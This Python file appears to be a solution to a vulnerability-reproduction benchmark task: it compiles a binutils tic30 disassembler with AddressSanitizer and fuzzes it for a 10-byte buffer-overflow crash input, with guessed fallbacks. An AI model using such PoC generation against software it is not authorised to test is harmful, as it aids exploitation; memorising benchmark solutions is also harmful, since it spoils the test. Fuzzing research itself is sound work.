import os
import tarfile
import tempfile
import subprocess
import random
import time
import re
import shlex
from typing import List, Optional


class Solution:
    def solve(self, src_path: str) -> bytes:
        start_time = time.time()
        tar_size = 0
        try:
            tar_size = os.path.getsize(src_path)
        except Exception:
            pass

        with tempfile.TemporaryDirectory() as tmpdir:
            # Extract tarball
            try:
                with tarfile.open(src_path, "r:*") as tf:
                    tf.extractall(tmpdir)
            except Exception:
                # If extraction fails, return simple fallback
                return b"A" * 10

            root = self._find_project_root(tmpdir)

            # Try to extract hex values from tic30-dis.c for heuristics
            hex_vals = self._extract_hex_values_from_tic30(root)

            # Try compile and fuzz if project seems small enough
            try:
                c_files = self._collect_c_files(root)
            except Exception:
                c_files = []

            poc: Optional[bytes] = None
            try:
                if c_files and len(c_files) <= 120 and (tar_size == 0 or tar_size <= 20 * 1024 * 1024):
                    # Reserve ~2/3 of total time for compile+fuzz, but cap at 40s
                    time_budget = max(5.0, min(40.0, 60.0 - (time.time() - start_time)))
                    exe_path = self._compile_project(root, c_files, time_budget * 0.4)
                    if exe_path is not None:
                        remaining = max(2.0, time_budget * 0.6)
                        poc = self._fuzz_executable(exe_path, hex_vals, remaining)
            except Exception:
                poc = None

            if poc is not None and len(poc) > 0:
                return poc

            # Static fallback using hex values from tic30-dis.c if available
            if hex_vals:
                bs = b""
                # Use up to 5 16-bit values to reach 10 bytes
                for v in hex_vals[:5]:
                    v16 = v & 0xFFFF
                    bs += v16.to_bytes(2, byteorder="little", signed=False)
                if len(bs) >= 10:
                    return bs[:10]

            # Final minimal fallback
            return b"A" * 10

    def _find_project_root(self, extract_dir: str) -> str:
        # If there's a single top-level directory, use it as root
        try:
            entries = [e for e in os.listdir(extract_dir) if not e.startswith(".")]
            if len(entries) == 1:
                single = os.path.join(extract_dir, entries[0])
                if os.path.isdir(single):
                    return single
        except Exception:
            pass
        return extract_dir

    def _collect_c_files(self, root: str) -> List[str]:
        c_files: List[str] = []
        for dirpath, _, filenames in os.walk(root):
            for f in filenames:
                if f.endswith(".c"):
                    c_files.append(os.path.join(dirpath, f))
        return c_files

    def _extract_hex_values_from_tic30(self, root: str) -> List[int]:
        hex_vals: List[int] = []
        target_path = None
        # Find tic30-dis.c or closest match
        for dirpath, _, filenames in os.walk(root):
            for f in filenames:
                lf = f.lower()
                if "tic30-dis" in lf and lf.endswith(".c"):
                    target_path = os.path.join(dirpath, f)
                    break
            if target_path:
                break

        if not target_path:
            return hex_vals

        try:
            with open(target_path, "r", errors="ignore") as f:
                text = f.read()
        except Exception:
            return hex_vals

        # Collect all hex constants in file
        all_hex = set(re.findall(r"0x[0-9a-fA-F]+", text))
        for h in all_hex:
            try:
                v = int(h, 16)
                # We are interested in 16- or small-width values
                if 0 <= v <= 0xFFFFFFFF:
                    hex_vals.append(v)
            except Exception:
                continue

        # Also try to extract more relevant values from entries mentioning print_branch
        branch_related_vals: List[int] = []
        for m in re.finditer(r"\{[^{}]*print_branch[^{}]*\}", text):
            entry = m.group(0)
            for h in re.findall(r"0x[0-9a-fA-F]+", entry):
                try:
                    v = int(h, 16)
                    if 0 <= v <= 0xFFFFFFFF:
                        branch_related_vals.append(v)
                except Exception:
                    continue

        # Prefer branch_related_vals if any, else general hex_vals
        vals = branch_related_vals if branch_related_vals else hex_vals
        # Deduplicate and sort to keep deterministic
        uniq = sorted(set(vals))
        # Limit to reasonable number
        if len(uniq) > 256:
            uniq = uniq[:256]
        return uniq

    def _compile_project(self, root: str, c_files: List[str], time_budget: float) -> Optional[str]:
        if time_budget <= 0:
            return None
        cc = os.environ.get("CC", "gcc")
        # Relative paths for compilation
        rel_c_files = [os.path.relpath(p, root) for p in c_files]
        # Build compile command
        cmd_parts = [
            shlex.quote(cc),
            "-O0",
            "-g",
            "-fsanitize=address",
            "-fno-omit-frame-pointer",
            "-std=c11",
            "-I.",
        ]
        cmd_parts.extend(shlex.quote(p) for p in rel_c_files)
        exe_name = "poc_bin"
        cmd_parts.extend(["-o", shlex.quote(exe_name)])
        cmd = " ".join(cmd_parts)

        try:
            proc = subprocess.run(
                cmd,
                shell=True,
                cwd=root,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=max(5.0, time_budget),
            )
        except Exception:
            return None

        if proc.returncode != 0:
            return None

        exe_path = os.path.join(root, exe_name)
        if not os.path.isfile(exe_path):
            return None
        return exe_path

    def _fuzz_executable(self, exe_path: str, hex_vals: List[int], time_budget: float) -> Optional[bytes]:
        if time_budget <= 0:
            return None
        start = time.time()
        modes = ["stdin", "file"]
        per_mode_budget = max(2.0, time_budget / len(modes))

        for idx, mode in enumerate(modes):
            remaining_overall = time_budget - (time.time() - start)
            if remaining_overall <= 0:
                break
            mode_budget = min(per_mode_budget, remaining_overall)
            poc = self._fuzz_mode(exe_path, mode, hex_vals, mode_budget, seed=1234 + idx * 1000)
            if poc is not None:
                return poc
        return None

    def _fuzz_mode(
        self,
        exe_path: str,
        mode: str,
        hex_vals: List[int],
        time_budget: float,
        seed: int,
    ) -> Optional[bytes]:
        start = time.time()
        rnd = random.Random(seed)
        # Focus around ground-truth length 10, try neighbors too
        lengths = [10, 9, 11, 8, 12]
        base_patterns = [
            b"\x00" * 10,
            b"\xff" * 10,
            bytes(range(10)),
            b"A" * 10,
        ]

        # Stage 1: deterministic patterns
        for pat in base_patterns:
            for L in lengths:
                if time.time() - start > time_budget:
                    return None
                data = (pat * ((L + len(pat) - 1) // len(pat)))[:L]
                if self._run_candidate(exe_path, mode, data):
                    return data

        # Stage 2: hex-based randomized patterns
        max_iters = 500
        for i in range(max_iters):
            if time.time() - start > time_budget:
                break
            L = lengths[i % len(lengths)]
            if hex_vals:
                data = self._gen_from_hex_vals(hex_vals, L, rnd)
            else:
                data = bytes(rnd.getrandbits(8) for _ in range(L))
            if self._run_candidate(exe_path, mode, data):
                return data

        return None

    def _gen_from_hex_vals(self, hex_vals: List[int], length: int, rnd: random.Random) -> bytes:
        b = bytearray()
        # Generate as sequence of 16-bit words from hex_vals
        while len(b) < length:
            v = rnd.choice(hex_vals) & 0xFFFF
            # Randomly choose endianness to increase chances
            if rnd.randint(0, 1) == 0:
                b.extend(v.to_bytes(2, byteorder="little", signed=False))
            else:
                b.extend(v.to_bytes(2, byteorder="big", signed=False))
        return bytes(b[:length])

    def _run_candidate(self, exe_path: str, mode: str, data: bytes) -> bool:
        env = os.environ.copy()
        # Ensure ASan doesn't abort the whole process
        asan_opts = env.get("ASAN_OPTIONS", "")
        extra_opts = "detect_leaks=0:abort_on_error=0"
        if asan_opts:
            if not asan_opts.endswith(":"):
                asan_opts += ":"
            asan_opts += extra_opts
        else:
            asan_opts = extra_opts
        env["ASAN_OPTIONS"] = asan_opts

        try:
            if mode == "stdin":
                proc = subprocess.run(
                    [exe_path],
                    input=data,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                    timeout=0.5,
                )
            else:
                # mode == "file"
                in_path = os.path.join(os.path.dirname(exe_path), "input.bin")
                try:
                    with open(in_path, "wb") as f:
                        f.write(data)
                except Exception:
                    return False
                proc = subprocess.run(
                    [exe_path, in_path],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    env=env,
                    timeout=0.5,
                )
        except subprocess.TimeoutExpired:
            return False
        except Exception:
            return False

        out = proc.stdout + proc.stderr
        if proc.returncode != 0:
            # Look for sanitizer indicators of buffer overflow
            indicators = [
                b"AddressSanitizer",
                b"stack-buffer-overflow",
                b"heap-buffer-overflow",
                b"buffer-overflow",
                b"buffer overflow",
            ]
            for ind in indicators:
                if ind in out:
                    return True
        return False